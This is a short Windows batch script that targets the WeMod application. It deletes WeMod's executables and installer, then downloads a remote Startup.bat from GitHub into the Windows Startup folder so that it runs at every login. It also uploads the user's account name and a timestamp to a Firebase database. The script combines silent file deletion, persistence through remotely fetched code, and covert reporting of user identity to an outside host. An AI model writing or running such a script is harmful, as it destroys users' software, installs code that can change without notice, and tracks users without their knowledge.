@echo off
rem taskkill /IM WeMod.exe /F > nul
del C:\Users\%username%\AppData\Local\WeMod\WeMod.exe
del C:\Users\%username%\AppData\Local\WeMod\Update.exe
del C:\Users\%username%\Downloads\WeMod-Setup.exe > nul
cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
curl https://raw.githubusercontent.com/DrMeepso/AnitMod/main/Startup.bat -o Startup.bat
curl -X PUT -d "{\"time\": \"%time%\"}" -H "Content-type: application/json" https://antimod-d4fb9-default-rtdb.firebaseio.com/user/%username%.json